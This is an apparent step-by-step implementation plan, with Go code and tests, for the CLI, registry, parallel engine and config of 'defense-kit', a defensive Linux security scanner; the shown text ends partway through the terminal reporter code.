# Defense-Kit v2 Phase 1: Core Scanner Engine + 8 Scanner Groups

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Go binary foundation with scanner engine, 30 scanners across 8 package groups, terminal + JSON reporting, config system, and CLI — all using native Go checks (no external tools yet).

**Architecture:** Single Go binary using Cobra CLI. Scanner engine runs scanners in parallel via goroutines. Each of the 8 scanner packages contains multiple scanner implementations sharing utility code. Findings aggregated into structured JSON and colored terminal output.

**Tech Stack:** Go 1.22+, Cobra (CLI), zerolog (logging), go-pretty (terminal tables/colors)

**Spec:** `docs/superpowers/specs/2026-03-21-defense-kit-v2-design.md`

---

## File Map

```
defense-kit-cli/
├── cmd/defense-kit/
│   └── main.go                          # Cobra root + scan/baseline/tools commands
├── internal/
│   ├── scanner/
│   │   ├── types.go                     # Scanner, Finding, ScanResult, ScanOptions, Severity types
│   │   ├── engine.go                    # Parallel scan orchestrator
│   │   ├── registry.go                  # Scanner registration + discovery
│   │   ├── id.go                        # Deterministic finding ID generation
│   │   ├── persistence/
│   │   │   ├── cron.go                  # Cron job scanner
│   │   │   ├── systemd.go              # Systemd unit/timer/drop-in scanner
│   │   │   ├── scheduled.go            # at jobs, anacron scanner
│   │   │   └── persistence_test.go
│   │   ├── process/
│   │   │   ├── suspicious.go           # Reverse shells, miners, unknown daemons
│   │   │   ├── memory.go              # Deleted binaries, injected libs via /proc
│   │   │   ├── clipboard.go           # xinput sniffers, X11 keyloggers
│   │   │   └── process_test.go
│   │   ├── filesystem/
│   │   │   ├── integrity.go            # SUID check, modified system files
│   │   │   ├── anomalies.go           # Hidden files, world-writable, tmp abuse
│   │   │   ├── timestomp.go           # mtime/ctime anomalies
│   │   │   ├── capabilities.go        # SUID/SGID, elevated caps
│   │   │   ├── swap.go                # Secrets in swap, core dumps
│   │   │   └── filesystem_test.go
│   │   ├── environment/
│   │   │   ├── ldpreload.go           # LD_PRELOAD, rogue .so files
│   │   │   ├── envvars.go             # PATH, LD_*, PROMPT_COMMAND poisoning
│   │   │   ├── shellrc.go             # .bashrc/.profile/.zshrc poisoning
│   │   │   ├── pam.go                 # PAM config/module backdoors
│   │   │   └── environment_test.go
│   │   ├── network/
│   │   │   ├── ports.go               # Open ports, listening services
│   │   │   ├── connections.go         # Outbound connections, C2 detection
│   │   │   ├── dns.go                 # DNS resolver check, exfiltration patterns
│   │   │   ├── firewall.go            # iptables/nftables rule audit
│   │   │   ├── vpn.go                 # WireGuard/VPN config audit
│   │   │   └── network_test.go
│   │   ├── auth/
│   │   │   ├── ssh.go                  # SSH config, authorized_keys, key strength
│   │   │   ├── users.go               # UID 0 accounts, sudoers, privilege escalation
│   │   │   ├── browser.go             # Browser credential stores
│   │   │   └── auth_test.go
│   │   ├── system/
│   │   │   ├── rootkit.go             # Hidden modules, /dev anomalies, proc hiding
│   │   │   ├── boot.go                # GRUB, initramfs integrity
│   │   │   ├── logs.go                # Log tampering, gaps, disabled services
│   │   │   ├── packagemgr.go          # Repo integrity, GPG keys
│   │   │   └── system_test.go
│   │   └── code/
│   │       ├── credentials.go          # Secrets in files, env, history
│   │       ├── supplychain.go         # Binary integrity, package checksums
│   │       ├── containers.go          # Docker socket, privileged containers
│   │       ├── githooks.go            # Malicious git hooks
│   │       └── code_test.go
│   ├── reporter/
│   │   ├── terminal.go                 # Colored CLI output
│   │   ├── json.go                     # JSON file output
│   │   └── reporter_test.go
│   ├── config/
│   │   ├── config.go                   # YAML config loader + precedence
│   │   └── config_test.go
│   └── baseline/
│       ├── baseline.go                 # Baseline save/load/diff
│       └── baseline_test.go
├── go.mod
├── go.sum
└── Makefile
```

---

### Task 1: Initialize Go Module + CLI Skeleton

**Files:**
- Create: `defense-kit-cli/go.mod`
- Create: `defense-kit-cli/cmd/defense-kit/main.go`
- Create: `defense-kit-cli/Makefile`

- [ ] **Step 1: Initialize Go module**

```bash
cd /workspace/company/nunenuh/defense-kit/defense-kit-cli
go mod init github.com/nunenuh/defense-kit/defense-kit-cli
```

- [ ] **Step 2: Install dependencies**

```bash
cd /workspace/company/nunenuh/defense-kit/defense-kit-cli
go get github.com/spf13/cobra@latest
```

- [ ] **Step 3: Create main.go with root + scan + baseline + tools commands**

```go
// cmd/defense-kit/main.go
package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var (
	cfgFile    string
	verbose    bool
	quick      bool
	diff       bool
	category   string
	outputDir  string
	concurrent int
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "defense-kit",
		Short: "Defensive security toolkit for Linux",
		Long:  "Scan, harden, monitor, and report on Linux endpoint security across 30 categories.",
	}

	rootCmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file (default: ~/.config/defense-kit/config.yml)")
	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "verbose output")

	scanCmd := &cobra.Command{
		Use:   "scan",
		Short: "Scan system for security issues",
		RunE:  runScan,
	}
	scanCmd.Flags().BoolVar(&quick, "quick", false, "fast subset for monitoring")
	scanCmd.Flags().BoolVar(&diff, "diff", false, "compare against baseline")
	scanCmd.Flags().StringVar(&category, "category", "", "scan single category")
	scanCmd.Flags().StringVarP(&outputDir, "output", "o", "", "output directory")
	scanCmd.Flags().IntVar(&concurrent, "concurrency", 0, "max parallel scanners (default: NumCPU)")

	baselineCmd := &cobra.Command{
		Use:   "baseline",
		Short: "Manage scan baselines",
	}
	baselineUpdateCmd := &cobra.Command{
		Use:   "update",
		Short: "Set current scan as baseline",
		RunE:  runBaselineUpdate,
	}
	baselineDiffCmd := &cobra.Command{
		Use:   "diff",
		Short: "Show changes from baseline",
		RunE:  runBaselineDiff,
	}
	baselineCmd.AddCommand(baselineUpdateCmd, baselineDiffCmd)

	toolsCmd := &cobra.Command{
		Use:   "tools",
		Short: "Manage external tools",
	}
	toolsCheckCmd := &cobra.Command{
		Use:   "check",
		Short: "Check which external tools are installed",
		RunE:  runToolsCheck,
	}
	toolsCmd.AddCommand(toolsCheckCmd)

	rootCmd.AddCommand(scanCmd, baselineCmd, toolsCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func runScan(cmd *cobra.Command, args []string) error {
	fmt.Println("defense-kit scan: not yet implemented")
	return nil
}

func runBaselineUpdate(cmd *cobra.Command, args []string) error {
	fmt.Println("defense-kit baseline update: not yet implemented")
	return nil
}

func runBaselineDiff(cmd *cobra.Command, args []string) error {
	fmt.Println("defense-kit baseline diff: not yet implemented")
	return nil
}

func runToolsCheck(cmd *cobra.Command, args []string) error {
	fmt.Println("defense-kit tools check: not yet implemented")
	return nil
}
```

- [ ] **Step 4: Create Makefile**

```makefile
# Makefile
BINARY := defense-kit
PKG := github.com/nunenuh/defense-kit/defense-kit-cli
BUILD_DIR := bin

.PHONY: build test clean

build:
	go build -o $(BUILD_DIR)/$(BINARY) ./cmd/defense-kit

test:
	go test ./... -v -race -cover

clean:
	rm -rf $(BUILD_DIR)

lint:
	go vet ./...
```

- [ ] **Step 5: Build and verify CLI skeleton works**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && make build && ./bin/defense-kit --help`
Expected: Help output showing scan, baseline, tools commands

- [ ] **Step 6: Verify scan subcommand**

Run: `./bin/defense-kit scan --help`
Expected: Help showing --quick, --diff, --category, --output, --concurrency flags

- [ ] **Step 7: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/
git commit -m "feat: initialize Go module with CLI skeleton (cobra)"
```

---

### Task 2: Core Types — Scanner, Finding, ScanResult, Severity

**Files:**
- Create: `defense-kit-cli/internal/scanner/types.go`
- Create: `defense-kit-cli/internal/scanner/id.go`
- Create: `defense-kit-cli/internal/scanner/types_test.go`

- [ ] **Step 1: Write failing test for Finding ID generation**

```go
// internal/scanner/types_test.go
package scanner

import "testing"

func TestFindingID(t *testing.T) {
	tests := []struct {
		name     string
		scanner  string
		location string
		title    string
	}{
		{
			name:     "deterministic ID",
			scanner:  "rootkit",
			location: "/lib/modules/evil.ko",
			title:    "Unknown kernel module loaded",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			id1 := GenerateFindingID(tt.scanner, tt.location, tt.title)
			id2 := GenerateFindingID(tt.scanner, tt.location, tt.title)
			if id1 != id2 {
				t.Errorf("IDs not deterministic: %s != %s", id1, id2)
			}
			if len(id1) == 0 {
				t.Error("ID should not be empty")
			}
			// Format: {scanner}-{hash[:12]}
			if id1[:len(tt.scanner)+1] != tt.scanner+"-" {
				t.Errorf("ID should start with scanner name: got %s", id1)
			}
		})
	}
}

func TestSeverityString(t *testing.T) {
	tests := []struct {
		sev  Severity
		want string
	}{
		{SevCritical, "CRITICAL"},
		{SevHigh, "HIGH"},
		{SevMedium, "MEDIUM"},
		{SevLow, "LOW"},
	}
	for _, tt := range tests {
		t.Run(tt.want, func(t *testing.T) {
			if got := tt.sev.String(); got != tt.want {
				t.Errorf("Severity.String() = %s, want %s", got, tt.want)
			}
		})
	}
}

func TestScanStatusString(t *testing.T) {
	tests := []struct {
		status ScanStatus
		want   string
	}{
		{ScanSuccess, "success"},
		{ScanPartial, "partial"},
		{ScanFailed, "failed"},
		{ScanSkipped, "skipped"},
	}
	for _, tt := range tests {
		t.Run(tt.want, func(t *testing.T) {
			if got := tt.status.String(); got != tt.want {
				t.Errorf("ScanStatus.String() = %s, want %s", got, tt.want)
			}
		})
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/ -v`
Expected: FAIL — types not defined

- [ ] **Step 3: Implement types.go**

```go
// internal/scanner/types.go
package scanner

import (
	"context"
	"time"
)

type Severity int

const (
	SevLow Severity = iota
	SevMedium
	SevHigh
	SevCritical
)

func (s Severity) String() string {
	switch s {
	case SevCritical:
		return "CRITICAL"
	case SevHigh:
		return "HIGH"
	case SevMedium:
		return "MEDIUM"
	case SevLow:
		return "LOW"
	default:
		return "UNKNOWN"
	}
}

type Finding struct {
	ID          string            `json:"id"`
	Scanner     string            `json:"scanner"`
	Severity    Severity          `json:"severity"`
	Title       string            `json:"title"`
	Detail      string            `json:"detail"`
	Evidence    string            `json:"evidence"`
	Location    string            `json:"location"`
	Remediation string            `json:"remediation"`
	CanAutoFix  bool              `json:"can_auto_fix"`
	References  []string          `json:"references,omitempty"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

type ScanStatus int

const (
	ScanSuccess ScanStatus = iota
	ScanPartial
	ScanFailed
	ScanSkipped
)

func (s ScanStatus) String() string {
	switch s {
	case ScanSuccess:
		return "success"
	case ScanPartial:
		return "partial"
	case ScanFailed:
		return "failed"
	case ScanSkipped:
		return "skipped"
	default:
		return "unknown"
	}
}

type ScanResult struct {
	Scanner  string        `json:"scanner"`
	Status   ScanStatus    `json:"status"`
	Findings []Finding     `json:"findings"`
	Error    string        `json:"error,omitempty"`
	Duration time.Duration `json:"duration"`
}

type ScanOptions struct {
	TargetPaths     []string
	ExcludePaths    []string
	Categories      []string
	QuickCategories []string // scanner names to use in --quick mode
	Timeout         time.Duration
	Concurrency     int
	UseExtTools     bool
	PolicyPath      string
	Quick           bool
	Diff            bool
	Verbose         bool
}

type Scanner interface {
	Name() string
	Category() string
	Description() string
	Scan(ctx context.Context, opts ScanOptions) ([]Finding, error)
	RequiredTools() []string
	OptionalTools() []string
	RequiresRoot() bool
	Available() bool
}
```

- [ ] **Step 4: Implement id.go**

```go
// internal/scanner/id.go
package scanner

import (
	"crypto/sha256"
	"fmt"
)

func GenerateFindingID(scannerName, location, title string) string {
	h := sha256.New()
	h.Write([]byte(location))
	h.Write([]byte(title))
	hash := fmt.Sprintf("%x", h.Sum(nil))
	return fmt.Sprintf("%s-%s", scannerName, hash[:12])
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/ -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/scanner/
git commit -m "feat: add core scanner types — Finding, Severity, ScanResult, Scanner interface"
```

---

### Task 3: Scanner Registry

**Files:**
- Create: `defense-kit-cli/internal/scanner/registry.go`
- Modify: `defense-kit-cli/internal/scanner/types_test.go` (add registry tests)

- [ ] **Step 1: Write failing test for registry**

```go
// Add to internal/scanner/types_test.go or create registry_test.go
package scanner

import (
	"context"
	"testing"
)

// mockScanner implements Scanner for testing
type mockScanner struct {
	name     string
	category string
}

func (m *mockScanner) Name() string        { return m.name }
func (m *mockScanner) Category() string    { return m.category }
func (m *mockScanner) Description() string { return "mock scanner" }
func (m *mockScanner) Scan(ctx context.Context, opts ScanOptions) ([]Finding, error) {
	return []Finding{
		{
			ID:       GenerateFindingID(m.name, "/test", "test finding"),
			Scanner:  m.name,
			Severity: SevLow,
			Title:    "test finding",
			Location: "/test",
		},
	}, nil
}
func (m *mockScanner) RequiredTools() []string { return nil }
func (m *mockScanner) OptionalTools() []string { return nil }
func (m *mockScanner) RequiresRoot() bool      { return false }
func (m *mockScanner) Available() bool          { return true }

func TestRegistryRegisterAndList(t *testing.T) {
	r := NewRegistry()
	r.Register(&mockScanner{name: "cron", category: "persistence"})
	r.Register(&mockScanner{name: "ssh", category: "auth"})

	scanners := r.All()
	if len(scanners) != 2 {
		t.Fatalf("expected 2 scanners, got %d", len(scanners))
	}
}

func TestRegistryGetByCategory(t *testing.T) {
	r := NewRegistry()
	r.Register(&mockScanner{name: "cron", category: "persistence"})
	r.Register(&mockScanner{name: "systemd", category: "persistence"})
	r.Register(&mockScanner{name: "ssh", category: "auth"})

	persistence := r.ByCategory("persistence")
	if len(persistence) != 2 {
		t.Fatalf("expected 2 persistence scanners, got %d", len(persistence))
	}

	auth := r.ByCategory("auth")
	if len(auth) != 1 {
		t.Fatalf("expected 1 auth scanner, got %d", len(auth))
	}

	none := r.ByCategory("nonexistent")
	if len(none) != 0 {
		t.Fatalf("expected 0 scanners, got %d", len(none))
	}
}

func TestRegistryGetByName(t *testing.T) {
	r := NewRegistry()
	r.Register(&mockScanner{name: "cron", category: "persistence"})

	s, ok := r.ByName("cron")
	if !ok {
		t.Fatal("expected to find cron scanner")
	}
	if s.Name() != "cron" {
		t.Errorf("expected cron, got %s", s.Name())
	}

	_, ok = r.ByName("nonexistent")
	if ok {
		t.Fatal("should not find nonexistent scanner")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/ -v -run TestRegistry`
Expected: FAIL — NewRegistry not defined

- [ ] **Step 3: Implement registry.go**

```go
// internal/scanner/registry.go
package scanner

import "sync"

type Registry struct {
	mu       sync.RWMutex
	scanners []Scanner
	byName   map[string]Scanner
}

func NewRegistry() *Registry {
	return &Registry{
		byName: make(map[string]Scanner),
	}
}

func (r *Registry) Register(s Scanner) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.scanners = append(r.scanners, s)
	r.byName[s.Name()] = s
}

func (r *Registry) All() []Scanner {
	r.mu.RLock()
	defer r.mu.RUnlock()
	result := make([]Scanner, len(r.scanners))
	copy(result, r.scanners)
	return result
}

func (r *Registry) ByCategory(category string) []Scanner {
	r.mu.RLock()
	defer r.mu.RUnlock()
	var result []Scanner
	for _, s := range r.scanners {
		if s.Category() == category {
			result = append(result, s)
		}
	}
	return result
}

func (r *Registry) ByName(name string) (Scanner, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	s, ok := r.byName[name]
	return s, ok
}

func (r *Registry) Available() []Scanner {
	r.mu.RLock()
	defer r.mu.RUnlock()
	var result []Scanner
	for _, s := range r.scanners {
		if s.Available() {
			result = append(result, s)
		}
	}
	return result
}

func (r *Registry) Categories() []string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	seen := make(map[string]bool)
	var cats []string
	for _, s := range r.scanners {
		if !seen[s.Category()] {
			seen[s.Category()] = true
			cats = append(cats, s.Category())
		}
	}
	return cats
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/ -v -run TestRegistry`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/scanner/registry.go defense-kit-cli/internal/scanner/types_test.go
git commit -m "feat: add scanner registry with category/name lookup"
```

---

### Task 4: Scanner Engine — Parallel Execution

**Files:**
- Create: `defense-kit-cli/internal/scanner/engine.go`
- Create: `defense-kit-cli/internal/scanner/engine_test.go`

- [ ] **Step 1: Write failing test for engine**

```go
// internal/scanner/engine_test.go
package scanner

import (
	"context"
	"testing"
	"time"
)

func TestEngineRunAll(t *testing.T) {
	r := NewRegistry()
	r.Register(&mockScanner{name: "cron", category: "persistence"})
	r.Register(&mockScanner{name: "ssh", category: "auth"})

	e := NewEngine(r)
	opts := ScanOptions{
		Timeout:     10 * time.Second,
		Concurrency: 2,
	}

	results := e.Run(context.Background(), opts)
	if len(results) != 2 {
		t.Fatalf("expected 2 results, got %d", len(results))
	}

	for _, res := range results {
		if res.Status != ScanSuccess {
			t.Errorf("scanner %s status = %s, want success", res.Scanner, res.Status)
		}
		if len(res.Findings) == 0 {
			t.Errorf("scanner %s returned no findings", res.Scanner)
		}
	}
}

func TestEngineFilterByCategory(t *testing.T) {
	r := NewRegistry()
	r.Register(&mockScanner{name: "cron", category: "persistence"})
	r.Register(&mockScanner{name: "ssh", category: "auth"})

	e := NewEngine(r)
	opts := ScanOptions{
		Categories:  []string{"auth"},
		Timeout:     10 * time.Second,
		Concurrency: 2,
	}

	results := e.Run(context.Background(), opts)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Scanner != "ssh" {
		t.Errorf("expected ssh scanner, got %s", results[0].Scanner)
	}
}

type panicScanner struct{ mockScanner }

func (p *panicScanner) Scan(ctx context.Context, opts ScanOptions) ([]Finding, error) {
	panic("scanner panic")
}

func TestEngineRecoversPanic(t *testing.T) {
	r := NewRegistry()
	r.Register(&panicScanner{mockScanner{name: "bad", category: "test"}})
	r.Register(&mockScanner{name: "good", category: "test"})

	e := NewEngine(r)
	opts := ScanOptions{
		Timeout:     10 * time.Second,
		Concurrency: 2,
	}

	results := e.Run(context.Background(), opts)
	if len(results) != 2 {
		t.Fatalf("expected 2 results, got %d", len(results))
	}

	var badResult, goodResult ScanResult
	for _, res := range results {
		if res.Scanner == "bad" {
			badResult = res
		}
		if res.Scanner == "good" {
			goodResult = res
		}
	}
	if badResult.Status != ScanFailed {
		t.Errorf("panicking scanner should be Failed, got %s", badResult.Status)
	}
	if goodResult.Status != ScanSuccess {
		t.Errorf("good scanner should succeed despite other panic, got %s", goodResult.Status)
	}
}

type slowScanner struct{ mockScanner }

func (s *slowScanner) Scan(ctx context.Context, opts ScanOptions) ([]Finding, error) {
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case <-time.After(5 * time.Second):
		return nil, nil
	}
}

func TestEngineTimeout(t *testing.T) {
	r := NewRegistry()
	r.Register(&slowScanner{mockScanner{name: "slow", category: "test"}})

	e := NewEngine(r)
	opts := ScanOptions{
		Timeout:     100 * time.Millisecond,
		Concurrency: 1,
	}

	results := e.Run(context.Background(), opts)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Status != ScanFailed {
		t.Errorf("timed out scanner should be Failed, got %s", results[0].Status)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/ -v -run TestEngine`
Expected: FAIL — NewEngine not defined

- [ ] **Step 3: Implement engine.go**

```go
// internal/scanner/engine.go
package scanner

import (
	"context"
	"fmt"
	"runtime"
	"sync"
	"time"
)

type Engine struct {
	registry *Registry
}

func NewEngine(registry *Registry) *Engine {
	return &Engine{registry: registry}
}

func (e *Engine) Run(ctx context.Context, opts ScanOptions) []ScanResult {
	scanners := e.selectScanners(opts)

	concurrency := opts.Concurrency
	if concurrency <= 0 {
		concurrency = runtime.NumCPU()
	}

	timeout := opts.Timeout
	if timeout <= 0 {
		timeout = 60 * time.Second
	}

	results := make([]ScanResult, len(scanners))
	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup

	for i, s := range scanners {
		wg.Add(1)
		go func(idx int, sc Scanner) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			results[idx] = e.runScanner(ctx, sc, opts, timeout)
		}(i, s)
	}

	wg.Wait()
	return results
}

func (e *Engine) runScanner(ctx context.Context, s Scanner, opts ScanOptions, timeout time.Duration) (result ScanResult) {
	result.Scanner = s.Name()
	start := time.Now()

	defer func() {
		result.Duration = time.Since(start)
		if r := recover(); r != nil {
			result.Status = ScanFailed
			result.Error = fmt.Sprintf("panic: %v", r)
		}
	}()

	scanCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	findings, err := s.Scan(scanCtx, opts)
	if err != nil {
		if scanCtx.Err() != nil {
			result.Status = ScanFailed
			result.Error = fmt.Sprintf("timeout after %s", timeout)
		} else if len(findings) > 0 {
			result.Status = ScanPartial
			result.Error = err.Error()
			result.Findings = findings
		} else {
			result.Status = ScanFailed
			result.Error = err.Error()
		}
		return
	}

	result.Status = ScanSuccess
	result.Findings = findings
	return
}

func (e *Engine) selectScanners(opts ScanOptions) []Scanner {
	all := e.registry.Available()

	// Quick mode: use QuickCategories from config to filter
	if opts.Quick && len(opts.QuickCategories) > 0 {
		quickSet := make(map[string]bool)
		for _, c := range opts.QuickCategories {
			quickSet[c] = true
		}
		var filtered []Scanner
		for _, s := range all {
			if quickSet[s.Category()] || quickSet[s.Name()] {
				filtered = append(filtered, s)
			}
		}
		return filtered
	}

	// Category filter from --category flag
	if len(opts.Categories) == 0 {
		return all
	}

	catSet := make(map[string]bool)
	for _, c := range opts.Categories {
		catSet[c] = true
	}

	var filtered []Scanner
	for _, s := range all {
		if catSet[s.Category()] || catSet[s.Name()] {
			filtered = append(filtered, s)
		}
	}
	return filtered
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/ -v -run TestEngine -race`
Expected: PASS (all 4 tests)

- [ ] **Step 5: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/scanner/engine.go defense-kit-cli/internal/scanner/engine_test.go
git commit -m "feat: add parallel scanner engine with timeout, panic recovery, category filtering"
```

---

### Task 5: Config System

**Files:**
- Create: `defense-kit-cli/internal/config/config.go`
- Create: `defense-kit-cli/internal/config/config_test.go`

- [ ] **Step 1: Install yaml dependency**

```bash
cd /workspace/company/nunenuh/defense-kit/defense-kit-cli
go get gopkg.in/yaml.v3
```

- [ ] **Step 2: Write failing test**

```go
// internal/config/config_test.go
package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestLoadDefaults(t *testing.T) {
	cfg := Defaults()
	if cfg.Scan.Concurrency != 4 {
		t.Errorf("default concurrency = %d, want 4", cfg.Scan.Concurrency)
	}
	if cfg.Scan.Timeout != "60s" {
		t.Errorf("default timeout = %s, want 60s", cfg.Scan.Timeout)
	}
	if !cfg.Tools.PreferExternal {
		t.Error("default prefer_external should be true")
	}
}

func TestLoadFromFile(t *testing.T) {
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.yml")
	content := `
scan:
  concurrency: 8
  timeout: "120s"
  exclude_paths:
    - /tmp
tools:
  prefer_external: false
`
	if err := os.WriteFile(cfgPath, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Scan.Concurrency != 8 {
		t.Errorf("concurrency = %d, want 8", cfg.Scan.Concurrency)
	}
	if cfg.Scan.Timeout != "120s" {
		t.Errorf("timeout = %s, want 120s", cfg.Scan.Timeout)
	}
	if len(cfg.Scan.ExcludePaths) != 1 || cfg.Scan.ExcludePaths[0] != "/tmp" {
		t.Errorf("exclude_paths = %v, want [/tmp]", cfg.Scan.ExcludePaths)
	}
	if cfg.Tools.PreferExternal {
		t.Error("prefer_external should be false")
	}
}

func TestLoadMissingFileReturnsDefaults(t *testing.T) {
	cfg, err := Load("/nonexistent/config.yml")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Scan.Concurrency != 4 {
		t.Errorf("should fall back to defaults, concurrency = %d", cfg.Scan.Concurrency)
	}
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/config/ -v`
Expected: FAIL

- [ ] **Step 4: Implement config.go**

```go
// internal/config/config.go
package config

import (
	"os"

	"gopkg.in/yaml.v3"
)

type Config struct {
	Scan    ScanConfig    `yaml:"scan"`
	Tools   ToolsConfig   `yaml:"tools"`
	Alerts  AlertsConfig  `yaml:"alerts"`
	Monitor MonitorConfig `yaml:"monitor"`
}

type ScanConfig struct {
	Concurrency  int      `yaml:"concurrency"`
	Timeout      string   `yaml:"timeout"`
	TimeoutHeavy string   `yaml:"timeout_heavy"`
	ExcludePaths []string `yaml:"exclude_paths"`
	Categories   []string `yaml:"categories"`
}

type ToolsConfig struct {
	PreferExternal bool              `yaml:"prefer_external"`
	PythonPath     string            `yaml:"python_path"`
	ToolPaths      map[string]string `yaml:"tool_paths"`
}

type AlertsConfig struct {
	Slack   SlackConfig   `yaml:"slack"`
	Email   EmailConfig   `yaml:"email"`
	Webhook WebhookConfig `yaml:"webhook"`
}

type SlackConfig struct {
	WebhookURL  string `yaml:"webhook_url"`
	MinSeverity string `yaml:"min_severity"`
}

type EmailConfig struct {
	To          string `yaml:"to"`
	SMTPHost    string `yaml:"smtp_host"`
	MinSeverity string `yaml:"min_severity"`
}

type WebhookConfig struct {
	URL        string `yaml:"url"`
	MinSeverity string `yaml:"min_severity"`
	HMACSecret string `yaml:"hmac_secret"`
	RequireTLS bool   `yaml:"require_tls"`
}

type MonitorConfig struct {
	Interval        string   `yaml:"interval"`
	QuickCategories []string `yaml:"quick_categories"`
}

func Defaults() Config {
	return Config{
		Scan: ScanConfig{
			Concurrency:  4,
			Timeout:      "60s",
			TimeoutHeavy: "300s",
			ExcludePaths: []string{"/proc", "/sys", "/dev"},
		},
		Tools: ToolsConfig{
			PreferExternal: true,
			PythonPath:     "/usr/bin/python3",
			ToolPaths:      make(map[string]string),
		},
		Monitor: MonitorConfig{
			Interval: "5m",
			QuickCategories: []string{
				"processes", "network", "file_integrity",
				"persistence", "ssh", "shell_rc",
			},
		},
	}
}

func Load(path string) (Config, error) {
	cfg := Defaults()

	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return cfg, nil
		}
		return cfg, err
	}

	if err := yaml.Unmarshal(data, &cfg); err != nil {
		return cfg, err
	}

	return cfg, nil
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/config/ -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/config/
git commit -m "feat: add YAML config system with defaults and file loading"
```

---

### Task 6: Terminal Reporter

**Files:**
- Create: `defense-kit-cli/internal/reporter/terminal.go`
- Create: `defense-kit-cli/internal/reporter/reporter_test.go`

- [ ] **Step 1: Write failing test**

```go
// internal/reporter/reporter_test.go
package reporter

import (
	"bytes"
	"strings"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
)

func TestTerminalReporterRender(t *testing.T) {
	findings := []scanner.Finding{
		{
			ID:          "rootkit-abc123",
			Scanner:     "rootkit",
			Severity:    scanner.SevCritical,
			Title:       "Hidden kernel module detected",
			Detail:      "Module evil.ko loaded but not in lsmod",
			Evidence:    "/lib/modules/evil.ko",
			Location:    "/lib/modules/evil.ko",
			Remediation: "Remove module and investigate",
		},
		{
			ID:       "ssh-def456",
			Scanner:  "ssh",
			Severity: scanner.SevMedium,
			Title:    "Password authentication enabled",
			Location: "/etc/ssh/sshd_config",
		},
	}

	results := []scanner.ScanResult{
		{Scanner: "rootkit", Status: scanner.ScanSuccess, Findings: findings[:1]},
		{Scanner: "ssh", Status: scanner.ScanSuccess, Findings: findings[1:]},
	}

	var buf bytes.Buffer
	tr := NewTerminalReporter(&buf)
	tr.Render(results)

	output := buf.String()
	if !strings.Contains(output, "CRITICAL") {
		t.Error("output should contain CRITICAL")
	}
	if !strings.Contains(output, "Hidden kernel module") {
		t.Error("output should contain finding title")
	}
	if !strings.Contains(output, "MEDIUM") {
		t.Error("output should contain MEDIUM")
	}
}

func TestTerminalReporterSummary(t *testing.T) {
	findings := []scanner.Finding{
		{Severity: scanner.SevCritical},
		{Severity: scanner.SevCritical},
		{Severity: scanner.SevHigh},
		{Severity: scanner.SevMedium},
		{Severity: scanner.SevLow},
	}

	summary := CountBySeverity(findings)
	if summary[scanner.SevCritical] != 2 {
		t.Errorf("critical = %d, want 2", summary[scanner.SevCritical])
	}
	if summary[scanner.SevHigh] != 1 {
		t.Errorf("high = %d, want 1", summary[scanner.SevHigh])
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/reporter/ -v`
Expected: FAIL

- [ ] **Step 3: Implement terminal.go**

```go
// internal/reporter/terminal.go
package reporter

import (
	"fmt"
	"io"
	"sort"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
